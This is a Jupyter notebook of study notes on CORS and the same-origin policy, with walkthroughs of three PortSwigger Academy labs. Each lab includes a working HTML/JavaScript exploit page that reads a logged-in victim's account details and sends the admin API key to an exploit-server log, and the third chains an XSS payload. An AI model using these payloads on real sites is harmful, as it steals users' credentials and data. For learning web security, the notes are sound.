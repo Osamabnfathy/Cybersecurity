{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "--------------------------------------------------------------------------------------------\n",
    "                        # Cross Origin Resource Sharing (CORS)                              "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Resources:\n",
    "\n",
    ">> labs:  \n",
    "   - https://portswigger.net/web-security/cors\n",
    "  \n",
    ">> Video:\n",
    "   - https://www.youtube.com/watch?v=-AkazVFgTJY&list=PLTSGZiCtCBfMMLkmaN7tGEhbc0QbOEtEA&index=33&pp=iAQB\n",
    "   - https://www.youtube.com/watch?v=hMEzLAmiN30&list=PLTSGZiCtCBfMMLkmaN7tGEhbc0QbOEtEA&index=34&pp=iAQB"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    ">> What is CORS (cross-origin resource sharing)?\n",
    "   - Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP)\n",
    "   \n",
    ">> What is SOP (Same-origin policy)?\n",
    "   - The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain.\n",
    "   - The same-origin policy is a web browser security mechanism that aims to prevent websites from attacking each other."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-1: CORS vulnerability with basic origin reflection:\n",
    "\n",
    "- Log in with (wiener: peter)\n",
    "- Intercept the *(GET /accountDetails)* request\n",
    "- Add a header *Origin: itsme.com* to see if it allows an origin\n",
    "- It will respond with *Access-Control-Allow-Origin: itsme.com*\n",
    "- Now craft a web page when it's clicked by the admin you get the API key\n",
    "- The Page code to add it to the exploit server:\n",
    "```html\n",
    "<html>\n",
    "  <body>\n",
    "    <script>\n",
    "      var req = new XMLHttpRequest();\n",
    "      var url = \"https://0a54003003ec551c8297970600b70004.web-security-academy.net/accountDetails\"\n",
    "      req.open('GET', url, true);   \n",
    "      req.withCredentials = true;\n",
    "      req.send(null)\n",
    "      req.onreadystatechange = function() {\n",
    "        if(req.readyState == XMLHttpRequest.DONE){\n",
    "          fetch(\"/log?key\" + req.responseText)\n",
    "        }\n",
    "      }\n",
    "    </script>\n",
    "  </body>\n",
    "</html>\n",
    "```\n",
    "- Then Send it to the victim and go to the *Access Log* to see the requests\n",
    "- Observe the *GET /log?key* request that contains the data of the API Key"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-2: CORS vulnerability with trusted null origin:\n",
    "\n",
    "- Log in with (wiener: peter)\n",
    "- Intercept the *(GET /accountDetails)* request\n",
    "- Add a header *Origin: itsme.com* to see if it allows an origin \n",
    "- If yes, It will respond with *Access-Control-Allow-Origin: itsme.com*\n",
    "- Now try *Origin: null* and see if it's in the response or not\n",
    "- Time to craft the page to get the API key of the admin\n",
    "- The page code add it to the exploit server:\n",
    "```html\n",
    "<html>\n",
    "  <body>\n",
    "    <iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html, <script>\n",
    "      var req = new XMLHttpRequest();\n",
    "      req.onload = reqListener;\n",
    "      req.open('GET', 'https://0a8d00270371a63e806a3f35008100cf.web-security-academy.net/accountDetails', true);\n",
    "      req.withCredentials = true;\n",
    "      req.send();\n",
    "      function reqListener() {\n",
    "        location = 'https://exploit-0add001f0308a68680ad3ed401eb001c.exploit-server.net/log?key='+encodeURIComponent(this.responseText);\n",
    "      };\n",
    "      </script>\">\n",
    "    </iframe>\n",
    "  </body>\n",
    "</html>\n",
    "```\n",
    "- Then Send it to the victim and go to the *Access Log* to see the requests\n",
    "- Observe the *GET /log?key* request that contains the data of the API Key"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-3: CORS vulnerability with trusted insecure protocols:\n",
    "\n",
    "- Log in with (wiener: peter)\n",
    "- Intercept the *(GET /accountDetails)* request\n",
    "- Add a header *Origin: itsme.com* to see if it allows an origin \n",
    "- If yes, It will respond with *Access-Control-Allow-Origin: itsme.com*\n",
    "- Then try *Origin: null* and see if it's in the response or not\n",
    "- Now try *Origin: http://hi.YOUR_Lab_ID.web-security-academy.net* \n",
    "- If you see *Access-Control-Allow-Origin: url* then it's vuln. cause it trust all the subdomains of its domain\n",
    "- Scan the page to get a subdomain that talk with the domain \"Check Stock functionality\"\n",
    "- Intercept the *Check Stock* request and see if it's vuln. to a XSS vulnerability\n",
    "- Time to craft the page to get the API key of the admin\n",
    "- The page code add it to the exploit server:\n",
    "```html\n",
    "<html>\n",
    "  <body>\n",
    "    <h1>hello</h1>\n",
    "    <script> \n",
    "      document.location=\"http://stock.0ae400620328752c84f1337300cf0003.web-security-academy.net/?productId=<script>var xhr=new XMLHttpRequest();var url='https://0ae400620328752c84f1337300cf0003.web-security-academy.net/accountDetails';xhr.onreadystatechange=function(){if(xhr.readyState==XMLHttpRequest.DONE){fetch('https://exploit-0a2a00cf03f67552848332a7010d0023.exploit-server.net/log?key='%2bxhr.responseText)};};xhr.open('GET',url,true);xhr.withCredentials=true;xhr.send(null);%3c/script>&storeId=1\"\n",
    "      </script> \n",
    "  </body>\n",
    "</html>\n",
    "```\n",
    "- This Code uses the Check stock functionality that is vulnerable to XSS to send a request to the domain server to exploit the CORS Vuln. to get the admin API key\n",
    "- Then Send it to the victim and go to the *Access Log* to see the requests\n",
    "- Observe the *GET /log?key* request that contains the data of the API Key"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
